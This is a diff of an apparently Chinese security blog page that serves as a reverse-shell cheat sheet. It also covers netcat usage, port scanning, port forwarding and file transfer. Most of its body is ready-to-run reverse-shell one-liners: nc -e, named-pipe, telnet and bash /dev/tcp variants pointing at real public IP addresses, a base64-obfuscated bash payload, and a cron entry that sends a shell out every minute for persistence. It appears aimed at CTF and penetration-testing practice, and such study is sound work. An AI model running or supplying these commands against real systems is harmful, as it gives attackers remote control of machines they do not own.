@@ -11,7 +11,7 @@
   <meta itemprop="name" content="反弹shell">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="476">
+  <meta itemprop="wordCount" content="455">
   <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/63/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="反弹shell">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/63\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  476 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  455 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/63\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>反弹shell</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="476 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="455 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,11 +152,30 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#主要参数">主要参数</a></li>
+    <li><a href="#扫描">扫描</a></li>
+    <li><a href="#聊天">聊天</a></li>
+    <li><a href="#shell">shell</a></li>
+    <li><a href="#端口转发">端口转发</a></li>
+    <li><a href="#代理">代理</a></li>
+    <li><a href="#传输">传输</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#nc--e">nc -e</a></li>
+    <li><a href="#管道">管道</a></li>
+    <li><a href="#telnet">telnet</a></li>
+    <li><a href="#bash">Bash</a></li>
+    <li><a href="#定时任务">定时任务</a></li>
+    <li><a href="#perl">Perl</a></li>
+    <li><a href="#python">python</a></li>
+    <li><a href="#curl">curl</a></li>
+    <li><a href="#php">php</a></li>
+    <li><a href="#ruby">ruby</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#base64">base64</a></li>
   </ul>
 </nav></div>
       </div><div class="content" id="content" data-end-flag="-----（完）-----"><blockquote>
@@ -172,11 +191,11 @@
 <p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>
 </blockquote>
 <p>原理：https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</p>
-<h5 id="nc" class="heading-element"><span>0.0.0.1  nc</span>
+<h1 id="nc" class="heading-element"><span>nc</span>
   <a href="#nc" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>nc全称为netcat</p>
 <p>既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。</p>
 </blockquote>
@@ -187,11 +206,11 @@
 <li>机器之间传输文件</li>
 <li>机器之间网络测速</li>
 </ol>
-<h6 id="主要参数" class="heading-element"><span>0.0.0.1.1  主要参数</span>
+<h2 id="主要参数" class="heading-element"><span>主要参数</span>
   <a href="#%e4%b8%bb%e8%a6%81%e5%8f%82%e6%95%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>-c shell commands	 与&#39;-e&#39;一样效果（use /bin/sh to exec ）
+</h2><pre tabindex="0"><code>-c shell commands	 与&#39;-e&#39;一样效果（use /bin/sh to exec ）
 
 -e filename      	程序重定向
 
@@ -223,35 +242,35 @@
 
 -w &lt;数字&gt;          timeout延时间隔 
 
--z                 将输入，输出关掉（用于扫描时） </code></pre><h6 id="扫描" class="heading-element"><span>0.0.0.1.2  扫描</span>
+-z                 将输入，输出关掉（用于扫描时） </code></pre><h2 id="扫描" class="heading-element"><span>扫描</span>
   <a href="#%e6%89%ab%e6%8f%8f" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>nc -v ip port            #扫瞄某 IP 的某个端口，返回端口信息详细输出。如：nc -v 96.44.174.9 80
+</h2><pre tabindex="0"><code>nc -v ip port            #扫瞄某 IP 的某个端口，返回端口信息详细输出。如：nc -v 96.44.174.9 80
 
-nc -v -z ip port-port            #扫描某IP的端口段，返回端口信息详细输出，但扫描速度很慢。如：nc -v -z 96.44.174.9 80-1024</code></pre><h6 id="聊天" class="heading-element"><span>0.0.0.1.3  聊天</span>
+nc -v -z ip port-port            #扫描某IP的端口段，返回端口信息详细输出，但扫描速度很慢。如：nc -v -z 96.44.174.9 80-1024</code></pre><h2 id="聊天" class="heading-element"><span>聊天</span>
   <a href="#%e8%81%8a%e5%a4%a9" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>nc -lvvp 7777                        #将监听到的信息输出到当前CMD窗口，这也是反弹shell的基础。
+</h2><pre tabindex="0"><code>nc -lvvp 7777                        #将监听到的信息输出到当前CMD窗口，这也是反弹shell的基础。
 nc -l -p 7777 &gt; C:/log.dat            #将监听到的信息输出到 C:/log.dat 下的日志文件里。
 
 nc -nvv 192.168.111.128 7777            #连接到192.168.1.101主机的7777
-完成上面两步相当于可以即时聊天了</code></pre><h6 id="shell" class="heading-element"><span>0.0.0.1.4  shell</span>
+完成上面两步相当于可以即时聊天了</code></pre><h2 id="shell" class="heading-element"><span>shell</span>
   <a href="#shell" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>正向</p>
+</h2><p>正向</p>
 <pre tabindex="0"><code>靶机：nc -lvvp 7777 -e /bin/bash
 本地：nc 192.168.242.129 7777
 我找它的ip</code></pre><p>反向</p>
 <pre tabindex="0"><code>靶机：nc -e /bin/bash 8.130.69.158 7788
 本地：nc -lvvp 7788
-他找我的ip</code></pre><h6 id="端口转发" class="heading-element"><span>0.0.0.1.5  端口转发</span>
+他找我的ip</code></pre><h2 id="端口转发" class="heading-element"><span>端口转发</span>
   <a href="#%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>在内网渗透中，端口转发可以用于实现以下几种应用：</p>
 <ol>
 <li>提供远程访问：当你成功渗透到目标网络的内部设备时，你可能希望通过互联网远程访问其他内部设备，但这些设备不可直接从互联网访问。通过设置端口转发，你可以将外部网络发送到一个可访问的端口，然后将流量转发到内部网络中的目标设备和端口上，从而实现远程访问。</li>
@@ -262,17 +281,17 @@ nc -nvv 192.168.111.128 7777            #连接到192.168.1.101主机的7777
 <p>nc -p -l  80 -c  &rsquo;nc ip port'</p>
 </blockquote>
 <p>所有连接到 80 端口的连接都会转发到 8080 端口</p>
-<pre tabindex="0"><code>nc -lvp  80 -c  &#39;nc -l 8080&#39;</code></pre><h6 id="代理" class="heading-element"><span>0.0.0.1.6  代理</span>
+<pre tabindex="0"><code>nc -lvp  80 -c  &#39;nc -l 8080&#39;</code></pre><h2 id="代理" class="heading-element"><span>代理</span>
   <a href="#%e4%bb%a3%e7%90%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>nc -l 8080 | nc 192.168.1.200 80</code></pre><p>所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。 要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:</p>
+</h2><pre tabindex="0"><code>nc -l 8080 | nc 192.168.1.200 80</code></pre><p>所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。 要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:</p>
 <pre tabindex="0"><code>mkfifo 2way
-nc -l 8080 0&lt;2way | nc 192.168.1.200 80 1&gt;2way</code></pre><h6 id="传输" class="heading-element"><span>0.0.0.1.7  传输</span>
+nc -l 8080 0&lt;2way | nc 192.168.1.200 80 1&gt;2way</code></pre><h2 id="传输" class="heading-element"><span>传输</span>
   <a href="#%e4%bc%a0%e8%be%93" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>(下面是我给目标主机传)</p>
+</h2><p>(下面是我给目标主机传)</p>
 <pre tabindex="0"><code>我：
 nc -vv IP port &lt; C:/http.txt            #提交http.txt内数据包到www.91ri.org的80端口，-vv参数会使速度变慢，但可以跟踪过程。例如IISput漏洞就可以自定义数据包使用此方法提交。如：nc -vv www.91ri.org 80 &lt; C:/http.txt
 nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称 
@@ -283,16 +302,16 @@ nc -lp 1234 &lt; libhax.so
 
 靶机
 cd  /tmp
-nc -nv 192.168.97.129 1234 &gt; libhax.so</code></pre><h5 id="反弹shell" class="heading-element"><span>0.0.0.2  反弹shell</span>
+nc -nv 192.168.97.129 1234 &gt; libhax.so</code></pre><h1 id="反弹shell" class="heading-element"><span>反弹shell</span>
   <a href="#%e5%8f%8d%e5%bc%b9shell" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p><a href="https://xz.aliyun.com/t/9488"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/9488</a></p>
-<h6 id="nc--e" class="heading-element"><span>0.0.0.2.1  nc -e</span>
+</h1><p><a href="https://xz.aliyun.com/t/9488"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/9488</a></p>
+<h2 id="nc--e" class="heading-element"><span>nc -e</span>
   <a href="#nc--e" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>==注意题目靶机不一定有nc==</p>
+</h2><p>==注意题目靶机不一定有nc==</p>
 <p>正向</p>
 <pre tabindex="0"><code>靶机：nc -lvvp 7788 -e /bin/bash
 本地：nc 172.18.105.20 778
@@ -303,28 +322,28 @@ windows靶机：nc -lvvp 7788 -e  cmd.exe</code></pre><p>反向</p>
 本地：nc -lvvp 7788
 他找我的ip
 
-windows靶机：nc -e cmd.exe 8.130.69.158 7788</code></pre><h6 id="管道" class="heading-element"><span>0.0.0.2.2  管道</span>
+windows靶机：nc -e cmd.exe 8.130.69.158 7788</code></pre><h2 id="管道" class="heading-element"><span>管道</span>
   <a href="#%e7%ae%a1%e9%81%93" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>mknod需要root用户，但是也可以通过<strong>mkfifo /tmp/backpipe</strong>也可以创建一个管道。</p>
+</h2><p>mknod需要root用户，但是也可以通过<strong>mkfifo /tmp/backpipe</strong>也可以创建一个管道。</p>
 <pre tabindex="0"><code>靶机：mknod /tmp/backpipe p
 /bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.101 7777 1&gt;/tmp/backpipe
-本地：nc -lnvp 7777</code></pre><h6 id="telnet" class="heading-element"><span>0.0.0.2.3  telnet</span>
+本地：nc -lnvp 7777</code></pre><h2 id="telnet" class="heading-element"><span>telnet</span>
   <a href="#telnet" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>方法一</p>
+</h2><p>方法一</p>
 <pre tabindex="0"><code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code></pre><p>方法二</p>
 <pre tabindex="0"><code>靶机：telnet 192.168.111.128 2333 | /bin/bash | telnet 192.1 4000
 
 攻击机开两个监听
 nc -lvvp 2333
-nc -lvvp 4000</code></pre><h6 id="bash" class="heading-element"><span>0.0.0.2.4  Bash</span>
+nc -lvvp 4000</code></pre><h2 id="bash" class="heading-element"><span>Bash</span>
   <a href="#bash" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>靶机：bash -c &#39;sh -i &amp;&gt;/dev/tcp/110.40.177.201/7788 0&gt;&amp;1&#39;
+</h2><pre tabindex="0"><code>靶机：bash -c &#39;sh -i &amp;&gt;/dev/tcp/110.40.177.201/7788 0&gt;&amp;1&#39;
 或者  bash -i &gt;&amp; /dev/tcp/8.130.69.158/7788 0&gt;&amp;1
 或者  bash -c &#34;bash -i &gt;&amp; /dev/tcp/110.40.177.201/7788 0&gt;&amp;1&#34;
 
@@ -342,47 +361,47 @@ bash -c &#39;{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzExMC40MC4xNzcuMjAxLzc3ODggM
 
 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/x.x.x.x/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
 
-/bin/bash  -i &gt; /dev/tcp/x.x.x.x/8080 0&lt;&amp;1 2&gt;&amp;1</code></pre><h6 id="定时任务" class="heading-element"><span>0.0.0.2.5  定时任务</span>
+/bin/bash  -i &gt; /dev/tcp/x.x.x.x/8080 0&lt;&amp;1 2&gt;&amp;1</code></pre><h2 id="定时任务" class="heading-element"><span>定时任务</span>
   <a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1
-#####每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</code></pre><h6 id="perl" class="heading-element"><span>0.0.0.2.6  Perl</span>
+</h2><pre tabindex="0"><code>*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1
+#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</code></pre><h2 id="perl" class="heading-element"><span>Perl</span>
   <a href="#perl" class="heading-mark">
